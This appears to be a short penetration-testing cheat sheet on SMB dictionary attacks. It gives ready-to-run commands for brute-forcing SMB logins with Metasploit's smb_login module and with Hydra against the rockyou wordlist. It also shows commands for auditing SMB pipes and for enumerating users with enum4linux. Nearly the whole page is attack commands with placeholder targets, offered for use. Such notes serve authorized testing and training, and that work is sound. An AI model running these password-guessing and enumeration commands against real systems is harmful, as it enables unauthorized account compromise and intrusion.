---
title: "Dictionary Attack"
---


This module will test an SMB login on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.

## Metasploit

```bash
msfconsole
use auxiliary/scanner/smb/smb_login 
set rhosts $IP
set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
set smbuser $USER_NAME # first there`s a need to enumerate some users
run
```

## Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP smb
```

![](../../../assets/image-1-1-2.png)

## SMB pipes

```bash
msfconsole
use auxiliary/scanner/smb/pipe_auditor
set smbuser $USER_NAME
set smbpass $PASSWORD
set rhosts $IP
run
```

## enum4linux

```bash
enum4linux -r -u "$USER_NAME" -p "$PASSWORD"
```
